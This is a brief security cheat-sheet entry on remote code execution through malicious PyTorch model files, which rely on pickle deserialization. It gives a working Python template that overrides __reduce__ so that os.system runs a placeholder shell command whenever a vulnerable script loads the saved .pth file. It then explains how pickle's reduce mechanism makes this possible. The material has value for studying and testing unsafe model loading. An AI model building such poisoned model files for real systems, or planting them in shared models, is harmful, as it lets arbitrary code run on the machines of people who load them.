# Data models (pytorch, pickle)

# Overview
If a model is parsed through a pytorch script, then one might be able to create a malicious model which can lead to RCE.

## Requirements
- The vulnerable script loads the model provided by the end-user

# Exploitation
```py
import torch
import torch.nn as nn
import os

class YourModel(nn.Module):
    def __init__(self):
        super(YourModel, self).__init__()
        self.dense = nn.Linear(10, 1)
    
    def forward(self, file):
        return self.dense(file)
   
    def __reduce__(self):
        cmd = "SHELL CODE HERE"
        return os.system, (cmd,)


model = YourModel()
torch.save(model, "file.pth")
```
By overwriting the `__reduce__` method, we can inject shell code and it will be executed whenever the vulnerable
script will try to load the module.

## Longer explanation
The `__reduce__` method returns either a string or a tuple which tells the script how to reconstruct the object
when unpickling.        
Usually, the tuple consists of:
- Callable (name of the class, function). In this case it's the `os.system` function.
- Arguments to be passed to the callable. Shell code in this case.

When the model is being parsed, the parsers will execute the callable with the arguments provided.